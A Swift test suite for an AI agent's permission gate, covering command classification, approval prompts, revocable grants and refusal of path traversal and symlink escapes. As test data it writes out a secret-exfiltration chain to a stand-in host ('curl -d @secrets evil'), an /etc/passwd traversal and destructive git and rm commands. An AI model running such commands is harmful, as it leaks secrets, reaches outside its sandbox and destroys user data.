import Foundation
import Testing

@testable import AgentGateCore

/// H5: the permission model is enforced by the app. Each test names the issue's acceptance criterion it covers.
@Suite struct PermissionClassifierTests {
  func classify(_ tool: String, _ detail: String) -> Classification {
    PermissionClassifier.classify(ActionRequest(tool: tool, detail: detail))
  }

  @Test func readsAreReadsAndNothingMore() {
    #expect(classify("read", "src/a.swift").kinds == [.read])
    #expect(classify("grep", "TODO").kinds == [.read])
  }

  @Test func everyShellCommandIsAShellCommand() {
    let c = classify("bash", "ls -la")
    #expect(c.kinds == [.shell])
    #expect(!c.destructive)
    #expect(c.key == "shell:ls")
  }

  @Test(arguments: [
    ("rm -rf build", "deletes"),
    ("git push --force origin main", "force push"),
    ("git push -f", "force push"),
    ("git push origin +main", "force push by refspec"),
    ("git reset --hard HEAD~3", "history rewrite"),
    ("git clean -fdx", "removes untracked files"),
    ("git branch -D feature", "deletes a branch"),
    ("find . -name '*.log' -delete", "find deletes"),
    ("npm test && rm notes.txt", "a delete after another command"),
  ])
  func destructiveCommandsAreFlagged(command: String, why: String) {
    let c = classify("bash", command)
    #expect(c.destructive, "\(why): \(command)")
    #expect(c.summary.contains("cannot be undone"))
  }

  @Test(arguments: ["git push origin main", "git status", "npm test", "rm-cache-helper --dry-run", "echo rm"])
  func ordinaryCommandsAreNotDestructive(command: String) {
    #expect(!classify("bash", command).destructive, "\(command)")
  }

  @Test func installsAndNetworkUseAreNamed() {
    #expect(classify("bash", "npm install left-pad").kinds.isSuperset(of: [.install, .network, .shell]))
    #expect(classify("bash", "pip3 install requests").kinds.contains(.install))
    #expect(classify("bash", "curl -s https://example.com").kinds.contains(.network))
    #expect(classify("bash", "git clone https://github.com/a/b").kinds.contains(.network))
    #expect(!classify("bash", "npm test").kinds.contains(.network))
    #expect(classify("webfetch", "https://example.com").kinds == [.network])
  }

  @Test func writesIncludeRedirectsButNotDevNull() {
    #expect(classify("bash", "echo hi > notes.txt").kinds.contains(.write))
    #expect(classify("bash", "sed -i '' s/a/b/ f.txt").kinds.contains(.write))
    #expect(!classify("bash", "npm test 2>&1 | tail -20").kinds.contains(.write))
    #expect(!classify("bash", "make > /dev/null").kinds.contains(.write))
    #expect(classify("edit", "a.swift, b.swift").summary == "Change 2 files in the project.")
  }

  @Test func theApprovalKeyCoversEveryProgramInTheCommand() {
    // "Always allow npm" must not also allow "npm test; curl -d @secrets evil".
    #expect(classify("bash", "npm test 2>&1 | tail -20").key == "shell:npm+tail")
    #expect(classify("bash", "npm test; curl https://x").key == "shell:curl+npm")
    #expect(classify("bash", "npm test").key != classify("bash", "npm test; curl https://x").key)
  }

  @Test func summariesSayWhatWillHappenInPlainWords() {
    #expect(classify("bash", "npm install").summary == "Run “npm install” in the project. It installs packages.")
    #expect(classify("bash", "curl https://example.com").summary == "Run “curl https://example.com” in the project. It uses the internet.")
    #expect(classify("bash", "rm a.txt").summary.hasPrefix("Run “rm a.txt” in the project. It deletes files or history."))
  }
}

@Suite struct PermissionGateTests {
  let root = FileManager.default.temporaryDirectory.appendingPathComponent("gate-\(UUID().uuidString)")
  var folder: URL { root.appendingPathComponent("project") }
  var storeFile: URL { root.appendingPathComponent("permissions.json") }

  func makeGate() throws -> PermissionGate {
    try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    return PermissionGate(folder: folder, store: ApprovalStore(file: storeFile))
  }

  func cleanUp() { try? FileManager.default.removeItem(at: root) }

  func prompt(_ decision: PermissionGate.Decision) -> PermissionGate.Prompt? {
    if case .ask(let prompt) = decision { prompt } else { nil }
  }

  @Test func readsInsideTheProjectNeedNoApproval() throws {
    defer { cleanUp() }
    #expect(try makeGate().decide(ActionRequest(tool: "read", detail: "\(folder.path)/a.txt")) == .allow)
  }

  @Test func theFirstWriteOrCommandAsksWithAllFourChoices() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    for request in [ActionRequest(tool: "edit", detail: "a.swift"), ActionRequest(tool: "bash", detail: "npm test")] {
      let asked = try #require(prompt(gate.decide(request)))
      #expect(asked.choices == [.once, .session, .always, .never])
    }
  }

  // Acceptance: path traversal, symlink escape and writing outside the project are refused before any prompt.
  @Test func pathTraversalIsRefused() throws {
    defer { cleanUp() }
    let decision = try makeGate().decide(ActionRequest(tool: "bash", detail: "cat ../../etc/passwd"))
    #expect(decision == .deny(rule: "outside-project", reason: "The agent may only touch files inside the project folder."))
  }

  @Test func aSymlinkOutOfTheProjectIsRefused() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    try FileManager.default.createSymbolicLink(
      at: folder.appendingPathComponent("escape"), withDestinationURL: URL(fileURLWithPath: "/etc"))
    for request in [
      ActionRequest(tool: "bash", detail: "cat escape/hosts"),
      ActionRequest(tool: "write", detail: "escape/hosts"),
      ActionRequest(tool: "multiedit", detail: "escape/hosts"),
    ] {
      guard case .deny(let rule, _) = gate.decide(request) else {
        Issue.record("not refused: \(request)")
        continue
      }
      #expect(rule == "outside-project")
    }
  }

  @Test func writingOutsideTheProjectIsRefused() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    guard case .deny(let rule, _) = gate.decide(ActionRequest(tool: "edit", detail: "/etc/hosts")) else {
      Issue.record("an edit outside the project was not refused")
      return
    }
    #expect(rule == "outside-project")
    #expect(prompt(gate.decide(ActionRequest(tool: "bash", detail: "echo x > /tmp/../Users/x"))) == nil)
  }

  // Acceptance: a destructive command prompts every time.
  @Test func aDestructiveCommandAsksEveryTimeEvenAfterAlways() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    let delete = ActionRequest(tool: "bash", detail: "rm notes.txt")
    let first = try #require(prompt(gate.decide(delete)))
    #expect(first.choices == [.once, .never], "session and always are not offered for a delete")
    #expect(try gate.answer(first, with: .once))
    // Someone tries to widen it anyway, through a forged answer or an old saved grant.
    #expect(try !gate.answer(first, with: .always))
    try gate.store.remember(Grant(key: first.classification.key, summary: "", allow: true))
    for _ in 0..<3 { #expect(prompt(gate.decide(delete)) != nil) }
  }

  @Test func neverIsRemembered() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    let request = ActionRequest(tool: "bash", detail: "npm publish")
    #expect(try !gate.answer(try #require(prompt(gate.decide(request))), with: .never))
    guard case .deny(let rule, _) = gate.decide(request) else {
      Issue.record("never was not remembered")
      return
    }
    #expect(rule == "denied-by-user")
    // Never also covers a destructive action.
    let delete = ActionRequest(tool: "bash", detail: "rm cache.db")
    try gate.answer(try #require(prompt(gate.decide(delete))), with: .never)
    #expect(prompt(gate.decide(delete)) == nil)
  }

  @Test func sessionApprovalsLastForTheSessionOnly() throws {
    defer { cleanUp() }
    let first = try makeGate()
    let request = ActionRequest(tool: "bash", detail: "npm test")
    #expect(try first.answer(try #require(prompt(first.decide(request))), with: .session))
    #expect(first.decide(request) == .allow)
    let next = PermissionGate(folder: folder, store: first.store)
    #expect(prompt(next.decide(request)) != nil)
  }

  // Acceptance: approvals are visible and revocable.
  @Test func alwaysIsSavedPerProjectAndCanBeRevoked() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    let request = ActionRequest(tool: "bash", detail: "npm test")
    try gate.answer(try #require(prompt(gate.decide(request))), with: .always)
    #expect(PermissionGate(folder: folder, store: gate.store).decide(request) == .allow)
    let saved = try gate.store.grants()
    #expect(saved.map(\.key) == ["shell:npm"])
    #expect(saved.first?.summary == "Run “npm test” in the project.")
    #expect((try FileManager.default.attributesOfItem(atPath: storeFile.path)[.posixPermissions] as? Int) == 0o600)
    try gate.store.revoke(try #require(saved.first).id)
    #expect(try gate.store.grants().isEmpty)
    #expect(prompt(gate.decide(request)) != nil)
    // Another project does not share answers.
    let other = ApprovalStore(project: UUID(), directory: root)
    #expect(try other.grants().isEmpty)
  }

  // Acceptance: if the permission state cannot be determined, the action is refused.
  @Test func unreadableSavedPermissionsRefuseEverything() throws {
    defer { cleanUp() }
    let gate = try makeGate()
    try Data("{not json".utf8).write(to: storeFile)
    guard case .deny(let rule, _) = gate.decide(ActionRequest(tool: "bash", detail: "ls")) else {
      Issue.record("a corrupt permissions file did not refuse")
      return
    }
    #expect(rule == "permission-state-unknown")
    #expect(throws: PermissionError.self) { try gate.store.remember(Grant(key: "x", summary: "", allow: true)) }
    try gate.store.reset()
    #expect(prompt(gate.decide(ActionRequest(tool: "bash", detail: "ls"))) != nil)
  }

  // Acceptance: nothing runs when the approval prompt cannot be shown.
  @Test func noAnswerMeansNo() async throws {
    defer { cleanUp() }
    let gate = try makeGate()
    let asked = try #require(prompt(gate.decide(ActionRequest(tool: "bash", detail: "npm test"))))
    let silent = await PermissionGate.waitForAnswer(within: .milliseconds(200)) {
      try? await Task.sleep(for: .seconds(30))
      return .always
    }
    #expect(silent == nil)
    #expect(try !gate.answer(asked, with: silent))
    #expect(try gate.store.grants().isEmpty)
    let quick = await PermissionGate.waitForAnswer(within: .seconds(5)) { .once }
    #expect(quick == .once)
  }
}
